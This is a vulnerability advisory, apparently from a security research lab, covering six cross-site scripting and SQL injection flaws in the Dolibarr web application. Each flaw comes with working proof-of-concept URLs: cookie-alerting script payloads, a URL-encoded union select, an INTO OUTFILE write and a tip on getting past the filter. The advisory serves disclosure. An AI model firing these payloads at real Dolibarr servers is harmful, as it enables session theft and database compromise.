Vulnerability Details:
High-Tech Bridge SA Security Research Lab has discovered multiple vulnerabilities in Dolibarr, which can be exploited to perform cross-site scripting & sql injection attacks.

1) Input appended to the URL after multiple files is not properly sanitised before being returned to the user. 
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of an affected site

The following PoC code is available:

http://[host]/index.php/%22%3E%3Cimg%20src=1%20onerror=javascript:alert%28document.cookie%29%3E
http://[host]/admin/boxes.php/%22%3E%3Cimg%20src=1%20onerror=javascript:alert%28document.cookie%29%3E
http://[host]/comm/clients.php/%22%3E%3Cimg%20src=1%20onerror=javascript:alert%28document.cookie%29%3E
http://[host]/commande/index.php/%22%3E%3Cimg%20src=1%20onerror=javascript:alert%28document.cookie%29%3E

Successful exploitation of this vulnerabilities requires that Apache's directive "AcceptPathInfo" is set to "on" or "default" (default value is "default") 

2) Input passed via the "sortfield", "sortorder" and "sall" GET parameters to /user/index.php is not properly sanitised before being used in a SQL query.
This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.

The following PoC code is available:

http://[host]/user/index.php?sall=1%%27%29%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%201,version%28%29,3,4,5,6,7,8,9,10,11,12,13,14%20--%20
http://[host]/user/index.php?begin=search_user=&sall=&&sortfield=SQL_CODE_HERE
http://[host]/user/index.php?begin=search_user=&sall=&sortfield=u.login&sortorder=SQL_CODE_HERE

Successful exploitation of this vulnerability requires attacker to be registered and logged-in.
To bypass Dolibarr sql-injection filter and exploit this vulnerability an attacker should use url-encode technique.

3) Input passed via the "id" GET parameter to /user/info.php, /user/perms.php, /user/param_ihm.php, /user/note.php, /user/fiche.php is not properly sanitised before being used in a SQL query.
This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.

The following PoC code is available:

http://[host]/user/info.php?id=1 INTO OUTFILE '../../../tmp/example'

Successful exploitation of this vulnerability requires attacker to be registered and logged-in.
To bypass Dolibarr sql-injection filter and exploit this vulnerability an attacker should use url-encode technique.

4) Input passed via the "rowid" GET parameter to /admin/boxes.php is not properly sanitised before being used in a SQL query.
This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.

The following PoC code is available:

http://[host]/admin/boxes.php?action=delete&rowid=SQL_CODE_HERE

Successful exploitation of this vulnerability requires attacker to be registered and logged-in.
To bypass Dolibarr sql-injection filter and exploit this vulnerability an attacker should use url-encode technique.

5) Input passed via the "sortfield" & "sortorder" & "sall" GET parameters to /user/group/index.php

is not properly sanitised before being used in a SQL query.
This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.

The following PoC code is available:

http://[host]/user/group/index.php?begin=search_user=&sall=&&sortfield=SQL_CODE_HERE
http://[host]/user/group/index.php?begin=search_user=&sall=&sortfield=u.login&sortorder=SQL_CODE_HERE
http://[host]/user/group/index.php?sall=SQL_CODE_HERE

Successful exploitation of this vulnerability requires attacker to be registered and logged-in.
To bypass Dolibarr sql-injection filter and exploit this vulnerability an attacker should use url-encode technique.

6) Input appended to the URL after multiple files is not properly sanitised before being returned to the user. 
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of an affected site

The following PoC code is available:

http://[host]/admin/ihm.php?optioncss=%22%3E%3Cimg%20src=1%20onerror=javascript:alert%28document.cookie%29%3E
http://[host]/user/home.php?optioncss=%22%3E%3Cimg%20src=1%20onerror=javascript:alert%28document.cookie%29%3E
